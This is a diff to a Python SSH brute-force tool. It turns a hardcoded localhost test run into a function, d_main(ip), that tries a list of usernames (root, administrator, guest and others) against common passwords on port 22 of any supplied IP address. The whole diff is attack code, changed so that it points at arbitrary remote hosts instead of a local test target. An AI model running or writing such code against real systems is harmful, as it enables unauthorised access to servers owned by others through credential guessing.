@@ -44,13 +44,12 @@ class SSHBruteForce():
         print("[*] Completed Brute Force.")
         sys.exit(0)
 
-
-if __name__ == '__main__':
+def d_main(ip):
     sshBruteForce = SSHBruteForce()
     user_pass_list = {'root': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'radhey': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'guest': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'administrator': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou']}
     for user in user_pass_list:
         for passwd in user_pass_list[user]:
-            sshBruteForce.createConnection(user,passwd,'127.0.0.1',2222,1000)
+            sshBruteForce.createConnection(user,passwd,ip,22,1000)
             sshBruteForce.currentThreadResults()
             if(Flag):
                 break
